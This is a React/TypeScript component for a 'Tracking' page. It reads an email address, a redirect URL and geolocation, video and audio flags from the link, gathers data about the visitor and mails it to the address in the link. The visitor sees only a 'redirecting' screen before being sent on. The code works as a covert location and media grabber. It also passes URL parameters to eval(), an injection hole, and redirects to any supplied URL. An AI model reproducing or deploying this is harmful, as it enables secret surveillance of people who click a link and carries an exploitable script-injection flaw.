import React, { useEffect } from "react";
import { Helmet } from "react-helmet";
import { useTranslation } from "react-i18next";
import { useLocation } from "react-router-dom";
import { BACKEND_TOKEN } from "../../Services/Credentials";

import { getUserData } from "../../Services/EnvironmentDataService";
import URLS from "../../Services/Urls";
import { TrackingRequest } from "../../Types/Types";
import Title from "../Atoms/Title";
import ContentWrapper from "../Molecules/ContentWrapper";
import Loading from "../Molecules/Loading";

function useQuery() {
  return new URLSearchParams(useLocation().search);
}

const ObjectToFormData = (obj: any): FormData => {
  let formData = new FormData();
  for (let key in obj) {
    formData.append(key, obj[key]);
  }
  return formData;
};

const Tracking: React.FC = () => {
  const { t } = useTranslation();
  const query = useQuery();

  const getTrackingRequest = (): {
    trackingRequest: TrackingRequest;
    allUrlParamsWereSupplied: boolean;
  } => {
    // extract trackingRequest's values from url params
    let trackingRequest = {
      email: query.get("email") ?? "",
      redirectUrl: query.get("redirectUrl") ?? "",
      askGeolocation: eval(query.get("askGeolocation") ?? "false"),
      askVideo: eval(query.get("askVideo") ?? "false"),
      askAudio: eval(query.get("askAudio") ?? "false"),
    };
    // validate if all url params are presented
    let allUrlParamsWereSupplied = true;
    Object.values(trackingRequest).forEach((value) => {
      if (typeof value === "string" && !value.length)
        allUrlParamsWereSupplied = false;
    });

    return {
      trackingRequest,
      allUrlParamsWereSupplied,
    };
  };

  const sendUserDataToSpecifiedEmail = async (
    toEmail: string,
    userData: FormData
  ) => {
    userData.append("toEmail", toEmail);
    try {
      await fetch(URLS.mailAPI + `?token=${BACKEND_TOKEN}`, {
        method: "POST",
        body: userData,
      });
    } catch (err) {
      console.error({ err });
    }
  };

  const handlePageFlow = async () => {
    const { trackingRequest, allUrlParamsWereSupplied } = getTrackingRequest();
    if (!allUrlParamsWereSupplied) window.location.href = "https://google.com/"; // If some of the data is missing, redirect user to google.com
    // get data about user
    const userData = await getUserData({
      askGeolocation: trackingRequest.askGeolocation,
      askAudio: trackingRequest.askAudio,
      askVideo: trackingRequest.askVideo,
    });
    // convert an Object to a formData
    let formData = ObjectToFormData(userData);
    // send an email
    await sendUserDataToSpecifiedEmail(trackingRequest.email, formData);
    // redirect to redirectUrl
    window.location.href = trackingRequest.redirectUrl;
  };

  useEffect(() => {
    handlePageFlow();
  }, [query]);

  return (
    <>
      <Helmet>
        <title>{t("seo.tracking.title")}</title>
        <meta name="description" content={t("seo.tracking.description")} />
      </Helmet>
      <ContentWrapper>
        <div style={{ textAlign: "center" }}>
          <Title>{t("tracking.redirecting")}</Title>
          <Loading />
        </div>
      </ContentWrapper>
    </>
  );
};

export default Tracking;
